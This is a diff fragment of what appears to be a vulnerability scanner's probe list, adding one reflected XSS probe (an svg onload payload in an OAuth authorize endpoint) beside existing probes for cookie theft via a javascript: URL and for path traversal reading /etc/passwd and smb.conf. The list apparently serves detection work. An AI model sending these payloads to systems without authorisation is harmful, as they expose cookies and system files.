@@ -21,3 +21,4 @@
 '/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(document.cookie);//itms://' 'support@sugarcrm.com'
 '/tmui/login.jsp/../tmui/locallb/workspace/fileRead.jspfileName=/etc/passwd' 'root:x'
 '/vpn/../vpns/cfg/smb.conf' '[global]'
+'/v1.0/endpoint/default/authorizethemeId=%27"><svg%2Fonload=%27alert1%27>&code_challenge=&code_challenge_method=&login_hint=&max_age=&prompt=&redirect_uri=&response_type=&scope=&state=' 'An Error Has Occurred'
